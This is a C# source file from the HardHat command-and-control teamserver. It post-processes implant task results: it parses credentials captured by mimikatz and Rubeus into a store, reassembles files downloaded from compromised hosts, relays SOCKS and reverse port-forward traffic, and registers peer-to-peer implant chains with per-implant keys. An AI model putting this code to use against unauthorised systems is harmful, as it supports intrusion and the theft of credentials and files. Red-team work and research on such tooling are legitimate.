using HardHatCore.ApiModels.Plugin_BaseClasses;
using HardHatCore.ApiModels.Plugin_Interfaces;
using System.Collections.Generic;
using System;
using System.ComponentModel.Composition;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using HardHatCore.TeamServer.Plugin_Interfaces.Ext_Implants;
using static SQLite.SQLite3;
using HardHatCore.ApiModels.Shared.TaskResultTypes;
using HardHatCore.ApiModels.Shared;
using Microsoft.AspNet.SignalR.Hosting;
using System.Text;
using HardHatCore.TeamServer.Models.Dbstorage;
using HardHatCore.TeamServer.Models.Extras;
using HardHatCore.TeamServer.Models.TaskResultTypes;
using HardHatCore.TeamServer.Plugin_Interfaces;
using HardHatCore.TeamServer.Plugin_Management;
using HardHatCore.TeamServer.Services;
using HardHatCore.TeamServer.Services.Handle_Implants;
using HardHatCore.TeamServer.Utilities;

namespace HardHatCore.TeamServer.Plugin_BaseClasses
{
    [Export(typeof(IExtImplant_TaskPostProcess))]
    [ExportMetadata("Name", "Default")]
    [ExportMetadata("Description", "Default post processing for the ExtImplant_Base Implant")]
    public class ExtImplant_TaskPostProcess_Base : IExtImplant_TaskPostProcess
    {
        public virtual bool DetermineIfTaskPostProc(ExtImplantTask_Base task)
        {
            return task.RequiresPostProc;
        }

        public virtual async Task PostProcessTask(IEnumerable<ExtImplantTaskResult_Base> results, ExtImplantTaskResult_Base result, ExtImplant_Base extImplant, ExtImplantTask_Base task)
        {
            if (result.Command.Equals("SocksConnect", StringComparison.CurrentCultureIgnoreCase))
            {
               await PostProcess_SocksConnect(result);
            }
            else if (result.Command.Equals("socksReceive", StringComparison.CurrentCultureIgnoreCase))
            {
                await PostProcess_SocksReceive(result);
            }
            else if (result.Command.Equals("download", StringComparison.CurrentCultureIgnoreCase))
            {
                await PostProcess_DownloadTask(result, extImplant.Metadata.Hostname, results, extImplant);
            }
            else if (result.Command.Equals("rportsend", StringComparison.CurrentCultureIgnoreCase))
            {
                await PostProcess_RPortForward(result);
            }
            else if (result.Command.Equals("P2PFirstTimeCheckIn", StringComparison.CurrentCultureIgnoreCase))
            {
                await PostProcess_P2PFirstCheckIn(result, extImplant);
            }
            else if (result.Command.Equals("CheckIn", StringComparison.CurrentCultureIgnoreCase))
            {
                await PostProcess_CheckIn(result, extImplant);
            }
            else if (result.Command.Equals("upload", StringComparison.CurrentCultureIgnoreCase))
            {
                await PostProcess_IOCFileUpload(result);
            }
            //else if (result.Command.Equals("vnc",StringComparison.CurrentCultureIgnoreCase))
            //{
            //    await PostProcess_VNC(result,task);
            //}
            //else if (result.Command.Equals("HandleVNCClientInteraction", StringComparison.CurrentCultureIgnoreCase))
            //{
            //    await PostProcess_VNCInteraction(result, task);
            //}
            //TODO: Move this somewhere else as the task containing this wont ever call the parent func
            else if(task.Arguments.Any(x => x.Value.Contains("mimikatz", StringComparison.CurrentCultureIgnoreCase)) || task.Arguments.Any(x => x.Value.Contains("rubeus", StringComparison.CurrentCultureIgnoreCase)))
            {
                await PostProcess_CredTask(result);
            }

        }

        public virtual async Task HandleDataChunking(IExtImplantTaskResult result)
        {
            ExtImplantService_Base extImplantService_Base = new ExtImplantService_Base();
            DataChunk dataChunk = result.Result.Deserialize<DataChunk>();
            //get the implamt this task belongs to 
            ExtImplant_Base taskedImp = extImplantService_Base.GetExtImplant(result.ImplantId);
            if (dataChunk.Type == 1)
            {
                if (taskedImp.TaskResultDataChunks.ContainsKey(result.Id))
                {
                    taskedImp.TaskResultDataChunks[result.Id] = taskedImp.TaskResultDataChunks[result.Id].Concat(dataChunk.Data).ToArray();
                }
                else
                {
                    taskedImp.TaskResultDataChunks.Add(result.Id, dataChunk.Data);
                }
                await HardHatHub.ImplantCheckIn(taskedImp);
            }
            //this means we have all the chunks and can process the data
            else if (dataChunk.Type == 2)
            {
                result.Result = taskedImp.TaskResultDataChunks[result.Id];

                result.ResponseType = dataChunk.RealResponseType;
                taskedImp.TaskResultDataChunks.Remove(result.Id);
            } 
        }

        public static async Task PostProcess_CredTask(ExtImplantTaskResult_Base result)
        {
            var CredsList = new List<Cred>();

            var capturedCreds = CapturedCredential.ParseCredentials(result.Result.Deserialize<MessageData>().Message);
            // for each credential in the list of captured credentials convert it to a Cred object, where CapturedCredential.Type is the Cred.Type and the Cred.Value is either the CapturedCredential Hash,Password, or ticket depending on type
            foreach (var cred in capturedCreds)
            {
                if (cred.Type == CredentialType.Password)
                {
                    //convert the cred object to a CapturedPasswordCredential
                    var passwordCred = (CapturedPasswordCredential)cred;
                    var credObject = new Cred { Domain = passwordCred.Domain, Name = passwordCred.Username, Type = Cred.CredType.password, CredentialValue = passwordCred.Password };
                    CredsList.Add(credObject);
                }
                else if (cred.Type == CredentialType.Hash)
                {
                    //convert the cred object to a CapturedHashCredential
                    var hashCred = (CapturedHashCredential)cred;
                    var credObject = new Cred { Domain = hashCred.Domain, Name = hashCred.Username, Type = Cred.CredType.hash, CredentialValue = hashCred.Hash, SubType = hashCred.HashCredentialType.ToString() };
                    CredsList.Add(credObject);
                }
                else if (cred.Type == CredentialType.Ticket)
                {
                    //convert the cred object to a CapturedTicketCredential
                    var ticketCred = (CapturedTicketCredential)cred;
                    var credObject = new Cred { Domain = ticketCred.Domain, Name = ticketCred.Username, Type = Cred.CredType.ticket, CredentialValue = ticketCred.Ticket, SubType = ticketCred.TicketCredentialType.ToString() };
                    CredsList.Add(credObject);
                }
            }
            //if CredsList is not empty then call HardHardHub.AddCreds
            if (CredsList.Count > 0)
            {
                //set to true cause these creds should be fresh and need to be placed in the db for backup
                await HardHatHub.AddCreds(CredsList, true);
            }
        }

        public static async Task PostProcess_DownloadTask(ExtImplantTaskResult_Base result, string hostname, IEnumerable<ExtImplantTaskResult_Base> results, ExtImplant_Base implant)
        {
            try
            {
                var finalByteArray = new byte[0];
                FilePart part = result.Result.Deserialize<FilePart>();
                if (!FilePart.FinalFileTracking.ContainsKey(result.Id))
                {
                    FilePart.FinalFileTracking.Add(result.Id, finalByteArray);
                }

                //get the download task that this result belongs to
                var downloadTask = await implant.GetTask(result.Id);

                downloadTask.Arguments.TryGetValue("/file", out string filename);
                // get the last word in the filename string and update filename to that
                var fileNameSplit = filename.Split("\\").Last();

                if (part.Type != 2)
                {
                    //remove result from results 
                    results.ToList().Remove(result);
                    FilePart.FinalFileTracking[result.Id] = FilePart.FinalFileTracking[result.Id].Concat(part.Data).ToArray();
                }
                else if (part.Type == 2)
                {
                    char allPlatformPathSeperator = Path.DirectorySeparatorChar;
                    // find the ExtImplant_Base cs file and load it to a string so we can update it and then run the compiler function on it
                    string path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                    //split path at bin keyword
                    string[] pathSplit = path.Split("bin"); //[0] is the parent folder [1] is the bin folder
                                                            //update each string in the array to replace \\ with the correct path seperator
                    pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());

                    System.IO.File.WriteAllBytes(pathSplit[0] + "Downloads" + $"{allPlatformPathSeperator}{fileNameSplit}", FilePart.FinalFileTracking[result.Id]);
                    result.ResponseType = ExtImplantTaskResponseType.None;
                    result.Result = FilePart.FinalFileTracking[result.Id];
                    FilePart.FinalFileTracking.Remove(result.Id);
                    //MessageData newResultMessage = new MessageData();
                    //newResultMessage.Message = "Successfully downloaded file check the downloads folder on the ts or the downloads tab on the client to sync up.";
                    //result.Result = newResultMessage.Serialize();
                    DownloadFile file = new DownloadFile();
                    file.Name = fileNameSplit;
                    file.OrginalPath = filename;
                    if (file.OrginalPath.StartsWith("\\\\"))
                    {
                        string hostpath = file.OrginalPath.Split("\\")[2];
                        file.Host = hostpath;
                    }
                    else
                    {
                        file.Host = hostname;
                    }
                    file.SavedPath = pathSplit[0] + "Downloads" + $"{allPlatformPathSeperator}{fileNameSplit}";
                    await HardHatHub.AlertDownload(file);
                }


            }
            catch (Exception ex)
            {
                Console.WriteLine("Error in post process file download");
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }

        }


        public static async Task PostProcess_SocksConnect(ExtImplantTaskResult_Base result)
        {
            try
            {
                string resultString = result.Result.Deserialize<MessageData>().Message;
                var socksConnected = resultString.Split(new[] { "\n" }, StringSplitOptions.None);
                //find the Proxy item in the HttpmanagerController dictionary that matches the socksConnected[1] key
                //Socks4Proxy socks4Proxy = HttpmanagerController.Proxy.Select(x => x.Value).Where(x => x.SocksDestinationConnected.ContainsKey(socksConnected[1])).FirstOrDefault();
                //Console.WriteLine($"Socks connected to client {socksConnected[1]}");
                string proxyID = HttpmanagerController.SocksClientToProxyCache[socksConnected[1]];
                HttpmanagerController.Proxy[proxyID].SocksDestinationConnected[socksConnected[1]] = true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }
        }

        public static async Task PostProcess_SocksReceive(ExtImplantTaskResult_Base result)
        {
            try
            {
                var socks_client_length = BitConverter.ToInt32(result.Result.Take(4).ToArray());
                var socks_client = result.Result.Skip(4).Take(socks_client_length).ToArray().Deserialize<MessageData>().Message;
                var socks_content = result.Result.Skip(4 + socks_client_length).Take(result.Result.Length - (4 + socks_client_length)).ToArray();

                //Console.WriteLine($"teamserver received {socks_content.Length} bytes from {socks_client}");
                //Socks4Proxy socks4Proxy = HttpmanagerController.Proxy.Select(x => x.Value).Where(x => x.SocksClientsData.ContainsKey(socks_client)).FirstOrDefault();
                string proxyID = HttpmanagerController.SocksClientToProxyCache[socks_client];
                HttpmanagerController.Proxy[proxyID].SocksClientsData[socks_client].Enqueue(socks_content);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }
        }

        public static async Task PostProcess_RPortForward(ExtImplantTaskResult_Base result)
        {
            //if result.Id is rportsend take the result.Result and split it at the new line and element 0 is the data and element 1 is the guid
            if (result.Id.Equals("rportsend", StringComparison.CurrentCultureIgnoreCase))
            {
                var split = result.Result.Deserialize<MessageData>().Message.Split(new[] { "\n" }, StringSplitOptions.None);
                byte[] temp = Convert.FromBase64String(split[0]); //split 0 is the data split 1 is the guid
                string client = split[1];
                Console.WriteLine($"teamserver received {temp.Length} bytes from {client}");
                RPortForward.RPortForwardClientsData[client].Enqueue(temp);
            }

        }

        public static async Task PostProcess_P2PFirstCheckIn(ExtImplantTaskResult_Base result, ExtImplant_Base HttpImp)
        {
            string[] resultArray = result.Result.Deserialize<MessageData>().Message.Split('\n');
            //this is the metadata stored in the result string from the p2p implant
            string Base64Metadata = resultArray[0];
            string parentId = resultArray[1];

            var svcPlugin_base = PluginService.GetImpServicePlugin(HttpImp.ImplantType);

            if(!IExtimplantHandleComms.ParentToChildTracker.ContainsKey(parentId))
            {
                IExtimplantHandleComms.ParentToChildTracker.Add(parentId, new List<string>() {result.ImplantId});
            }
            else
            {
                IExtimplantHandleComms.ParentToChildTracker[parentId].Add(result.ImplantId);
            }

            if (!IExtimplantHandleComms.P2P_PathStorage.ContainsKey(result.ImplantId))
            {
                // new implamt, key is its id, value is its path, if its parent id is equal to the http implamt then just the http implamt id is its path, otherwise check if its parent is in the HttpmanagerController.PathStorage 
                if (parentId == HttpImp.Metadata.Id)
                {
                    Console.WriteLine($"adding new path of {HttpImp.Metadata.Id} -> {result.ImplantId}");
                    IExtimplantHandleComms.P2P_PathStorage.Add(result.ImplantId, new List<string> { HttpImp.Metadata.Id, result.ImplantId });
                }
                else
                {
                    foreach (var kvp in IExtimplantHandleComms.P2P_PathStorage)
                    {
                        if (kvp.Key == parentId)
                        {
                            var path = kvp.Value;
                            // this should end up making it easy to have path regradless of depth
                            //add to Handle_ExtImplant_Base.PathStorage the result.ImplantId as the key and the value is each element in the path list and the result.ImplantId
                            Console.WriteLine($"adding new path of {string.Join("->", path)} -> {result.ImplantId}");
                            var temp = new List<string>();
                            path.ForEach(x => temp.Add(x));
                            IExtimplantHandleComms.P2P_PathStorage.Add(result.ImplantId, temp);
                            IExtimplantHandleComms.P2P_PathStorage[result.ImplantId].Add(result.ImplantId); // I was adding path here and then adding to it which updated path in both spots.
                            break;
                        }
                    }
                }
            }
            byte[] p2pMetaDataByte = Convert.FromBase64String(Base64Metadata);
            ExtImplantMetadata_Base p2pEngMetadata = p2pMetaDataByte.Deserialize<ExtImplantMetadata_Base>();
            var p2pimplamt = svcPlugin_base.GetExtImplant(p2pEngMetadata.Id);
            if (p2pimplamt is null)                              // if Engineer is null then this is the first time connecting so send metadata and add to list
            {
                // use the parent id to get the parents pid@address 
                var parentImp = svcPlugin_base.GetExtImplant(IExtimplantHandleComms.P2P_PathStorage[p2pEngMetadata.Id][0]);
                var extralAddressP2PString = parentImp.Metadata.ProcessId + "@" + parentImp.Metadata.Address;

                p2pimplamt = svcPlugin_base.InitImplantObj(p2pEngMetadata, HttpImp.ImplantType);
                p2pimplamt.ExternalAddress = extralAddressP2PString;
                p2pimplamt.ConnectionType = managerService._managers.FirstOrDefault(m => m.Name == p2pEngMetadata.ManagerName).Type.ToString();
                if (DatabaseService.AsyncConnection == null)
                {
                    DatabaseService.ConnectDb();
                }
                DatabaseService.AsyncConnection.InsertAsync((ExtImplant_DAO)p2pimplamt);
                svcPlugin_base.AddExtImplant(p2pimplamt);                    // uses service too add Engineer to list
                HardHatHub.AlertEventHistory(new HistoryEvent { Event = $"implamt {p2pimplamt.Metadata.Id} checked in for the first time", Status = "Success" });
                LoggingService.EventLogger.ForContext("implamt Metadata", p2pimplamt.Metadata, true).ForContext("connection Type", p2pimplamt.ConnectionType).Information($"implamt {p2pimplamt.Metadata.ProcessId}@{p2pimplamt.Metadata.Address} checked in for the first time");

                //create the unique encryption key for this implant
                Encryption.GenerateUniqueKeys(p2pimplamt.Metadata.Id);
                ExtImplantTask_Base updateTaskKey = new ExtImplantTask_Base
                {
                    Command = "UpdateTaskKey",
                    Id = Guid.NewGuid().ToString(),
                    Arguments = new Dictionary<string, string> { { "TaskKey", Encryption.UniqueTaskEncryptionKey[p2pimplamt.Metadata.Id] } },
                    File = null,
                    IsBlocking = false
                };
                p2pimplamt.QueueTask(updateTaskKey);
            }
            //checkin and get/post data to or from the implamt 
            p2pimplamt.CheckIn();
        }

        public static async Task PostProcess_CheckIn(ExtImplantTaskResult_Base result, ExtImplant_Base implant)
        {
            var svcPlugin_base = PluginService.GetImpServicePlugin(implant.ImplantType);
            var P2Pimplant = svcPlugin_base.GetExtImplant(result.ImplantId);
            P2Pimplant.CheckIn();
        }

        public static async Task PostProcess_IOCFileUpload(ExtImplantTaskResult_Base result)
        {
            //check if result id matches any in IOCFile.PendingIOCFiles if it does then remove it from the dictionary and invoke the hub function to send it out 
            if (IOCFile.PendingIOCFiles.ContainsKey(result.Id))
            {
                IOCFile pending = IOCFile.PendingIOCFiles[result.Id];
                await HardHatHub.AddIOCFile(pending);
                IOCFile.PendingIOCFiles.Remove(result.Id);
            }
        }

        //public static async Task PostProcess_VNC(ExtImplantTaskResult_Base result, ExtImplantTask_Base task)
        //{
        //    try
        //    {
        //        Console.WriteLine($"VNC PostProcess called");
        //        //convert the result to a string and check the vncUtil ImplantVNCSessionMeta directory for the session and set the IsSessionRunning to true if the task argument for "/operation" is start
        //        VncInteractionResponse vncResult = result.Result.Deserialize<VncInteractionResponse>();
        //        if (task.Arguments["/operation"].Trim().Equals("start", StringComparison.CurrentCultureIgnoreCase))
        //        {
        //            var session = VNC_Util.ImplantVNCSessionMeta[vncResult.SessionID];
        //            session.IsSessionRunning = true;
        //            session.LastHeartbeatResponse = DateTime.UtcNow;
        //            await HardHatHub.AddVNCInteractionResponse(vncResult, session);
        //        }
        //        else if (task.Arguments["/operation"].Trim().Equals("stop", StringComparison.CurrentCultureIgnoreCase))
        //        {
        //            foreach (var session in VNC_Util.ImplantVNCSessionMeta)
        //            {
        //                if (session.Key == vncResult.SessionID)
        //                {
        //                    Console.WriteLine($"setting VNC Session {session.Value.SessionID} to false");
        //                    session.Value.IsSessionRunning = false;
        //                    break;
        //                }
        //            }
        //        }
        //        else
        //        {
        //            Console.WriteLine("VNC operation not recognized");
        //        }

        //    }
        //    catch (Exception ex)
        //    {
        //        Console.WriteLine(ex.Message);
        //    }
        //}

        //public static async Task PostProcess_VNCInteraction(ExtImplantTaskResult_Base result, ExtImplantTask_Base task)
        //{
        //    //convert it into a VncInteractionResponse, update the metadata and send the result to the hub
        //    VncInteractionResponse response = result.Result.Deserialize<VncInteractionResponse>();
        //    var vncSessionMetadata = VNC_Util.ImplantVNCSessionMeta[response.SessionID];
        //    vncSessionMetadata.IsSessionRunning = true;
        //    vncSessionMetadata.LastHeartbeatResponse = DateTime.UtcNow;
        //    vncSessionMetadata.ScreenHeight = response.ScreenHeight;
        //    vncSessionMetadata.ScreenWidth = response.ScreenWidth;
        //    await HardHatHub.AddVNCInteractionResponse(response,vncSessionMetadata);

        //}
    }

    public interface IExtImplant_TaskPostProcessData : IPluginMetadata
    {
    }
}
